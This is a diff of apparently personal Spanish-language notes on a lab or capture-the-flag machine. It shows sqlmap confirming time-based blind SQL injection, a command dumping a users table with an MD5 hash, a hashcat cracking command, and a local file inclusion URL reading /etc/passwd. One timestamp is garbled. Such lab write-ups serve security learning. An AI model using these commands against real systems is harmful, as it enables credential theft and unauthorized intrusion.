@@ -228,6 +228,37 @@ available databases [2]:
 [00:21:55] [INFO] fetched data logged to text files under '/home/davidoberst/.local/share/sqlmap/output/10.66.168.77'
 
 
-Confirmó que el parámetro username es vulnerable a Time-based blind (basado en tiempo con SLEEP). Tardó 10 segundos en reaccionar ahí (00:19:44 a 00:19:54) porque el servidor se quedó dormido tal como sqlmap le ordenó.
+Confirmó que el parámetro username es vulnerable a Time-based blind (basado en tiempo con SLEEP). Tardó 10 segundos en reaccionar ahí (00:19:s44 a 00:19:54) porque el servidor se quedó dormido tal como sqlmap le ordenó.
 
-el servidor intentó redirigirte (HTTP 302) a /secret-script.php?file=supersecretadminpanel.html. Le dijiste que sí la siguiera, pero le dijiste que No (N) reenviara los datos POST al nuevo sitio, lo cual fue la decisión correcta para que sqlmap siguiera concentrado en el formulario de login.
+luego del escaneo el servidor me dirigio a (HTTP 302)  /secret-script.php?file=supersecretadminpanel.html. 
+
+me llevo a un panel de administracion que contiene users, messages,orders. : 
+
+
+vere que informacion tiene la base de datos con 
+
+
+sqlmap -r t.txt -p username --batch -D users --dump
+
+the result was : 
+
+Database: users
+Table: users
+[1 entry]
++----+----------------------------------+----------+
+| id | password                         | username |
++----+----------------------------------+----------+
+| 1  | 5b0c2e1b4fe1410e47f26feff7f4fc4c | comte    |
++----+----------------------------------+----------+
+
+voy a crackear el hash md5 de la contraseña 
+
+hashcat -m 0 5b0c2e1b4fe1410e47f26feff7f4fc4c rockyou.txt
+
+al finalizar , hashcat no pudo crackear el hash, asi que continuare para ver si hay otros metodos de intrusion.
+
+en el panel, pude lograr una lfi con un payload 
+
+http://10.64.186.193/secret-script.php?file=/etc/passwd
+
+
